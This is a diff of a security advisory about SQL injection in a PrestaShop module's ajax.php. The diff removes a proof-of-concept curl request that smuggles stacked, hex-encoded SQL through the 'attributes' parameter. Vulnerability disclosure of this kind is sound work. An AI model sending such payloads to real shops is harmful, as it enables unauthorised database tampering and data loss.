@@ -48,12 +48,6 @@ Up to 0.3.0, a sensitive SQL calls in file `includes/ajax.php` can be executed w
 * Remove all data of the linked PrestaShop
 * Display sensitives tables to front-office to unlock potential admin's ajax scripts of modules protected by token on the ecosystem
 
-## Proof of concept
-
-```bash
-curl -v https://domain.tld/modules/aicombinationsonfly/includes/ajax.php?token=<predictible token>&module=AIMD&action=createCombination&product=1&attributes=1);select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;%23
-```
-
 ## Patch
 
 ```diff
